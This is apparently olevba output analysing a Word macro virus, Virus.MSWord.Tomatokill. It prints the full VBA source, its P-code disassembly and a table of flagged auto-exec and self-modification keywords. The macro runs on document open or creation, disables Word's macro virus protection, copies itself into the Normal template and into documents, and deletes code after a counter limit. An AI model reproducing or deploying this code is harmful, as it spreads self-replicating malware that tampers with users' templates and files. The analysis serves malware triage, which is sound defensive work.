olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tomatokill
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tomatokill - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'---------------------------------------------------------------------
'Tomato
'Tomato killer
'now: 1
'max: 60
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = False
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If nt.Lines(5, 1) = "'Tomato killer" Then
    t = Val(Mid(nt.Lines(6, 1), 7, 2))
    t = t + 1
    nt.replaceline 6, "'now:" + Str(t)
    If (t > Val(Mid(nt.Lines(7, 1), 7, 2))) Then
        nt.DeleteLines 1, nt.CountOfLines
        NormalTemplate.Save
    End If
Else
    nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    NormalTemplate.Save
End If
If ad.Lines(5, 1) <> "'Tomato killer" Then
    t = Val(Mid(nt.Lines(7, 1), 7, 2))
    t = t + 5
    If (ad.CountOfLines > 0) Then nt.replaceline 7, "'max:" + Str(t)
    ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.replaceline 6, "'now: 0"
    ad.replaceline 7, "'max: 60"
    ActiveDocument.Save
End If
If ad.Lines(5, 1) = "'Tomato killer" Then
    t = Val(Mid(ad.Lines(6, 1), 7, 2))
    t = t + 1
    ad.replaceline 6, "'now:" + Str(t)
    If (t > Val(Mid(ad.Lines(7, 1), 7, 2))) Then ad.DeleteLines 1, ad.CountOfLines
    ActiveDocument.Save
End If
Exit1:
End Sub

Private Sub Document_New()
    Document_Open
End Sub


' AntiTomato
' Copyright (c) Djaa inc. 2001 - 2002
' Åñëè âû íå õîòèòå èñïîëüçîâàòü ýòîò ìàêðîñ, â îêíå ðåäàêòèðîâàíèÿ ïðîåêòà âûäåëèòå âåñü òåêñò è íàæìèòå êíîïêó Delete
' All right reserved

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tomatokill
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3955 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "---------------------------------------------------------------------"
' Line #3:
' 	QuoteRem 0x0000 0x0006 "Tomato"
' Line #4:
' 	QuoteRem 0x0000 0x000D "Tomato killer"
' Line #5:
' 	QuoteRem 0x0000 0x0006 "now: 1"
' Line #6:
' 	QuoteRem 0x0000 0x0007 "max: 60"
' Line #7:
' 	OnError Exit1 
' Line #8:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	St SaveNormalPrompt 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'Tomato killer"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St t 
' Line #14:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #15:
' 	LitDI2 0x0006 
' 	LitStr 0x0005 "'now:"
' 	Ld t 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall replaceline 0x0002 
' Line #16:
' 	Ld t 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld nt 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'Tomato killer"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St t 
' Line #28:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Add 
' 	St t 
' Line #29:
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0007 
' 	LitStr 0x0005 "'max:"
' 	Ld t 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld ad 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	LitDI2 0x0006 
' 	LitStr 0x0007 "'now: 0"
' 	Ld ad 
' 	ArgsMemCall replaceline 0x0002 
' Line #34:
' 	LitDI2 0x0007 
' 	LitStr 0x0008 "'max: 60"
' 	Ld ad 
' 	ArgsMemCall replaceline 0x0002 
' Line #35:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'Tomato killer"
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St t 
' Line #39:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #40:
' 	LitDI2 0x0006 
' 	LitStr 0x0005 "'now:"
' 	Ld t 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld ad 
' 	ArgsMemCall replaceline 0x0002 
' Line #41:
' 	Ld t 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Label Exit1 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Private Sub Document_New())
' Line #48:
' 	ArgsCall Document_Open 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' Line #52:
' 	QuoteRem 0x0000 0x000B " AntiTomato"
' Line #53:
' 	QuoteRem 0x0000 0x0024 " Copyright (c) Djaa inc. 2001 - 2002"
' Line #54:
' 	QuoteRem 0x0000 0x0076 " Åñëè âû íå õîòèòå èñïîëüçîâàòü ýòîò ìàêðîñ, â îêíå ðåäàêòèðîâàíèÿ ïðîåêòà âûäåëèòå âåñü òåêñò è íàæìèòå êíîïêó Delete"
' Line #55:
' 	QuoteRem 0x0000 0x0013 " All right reserved"
' Line #56:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

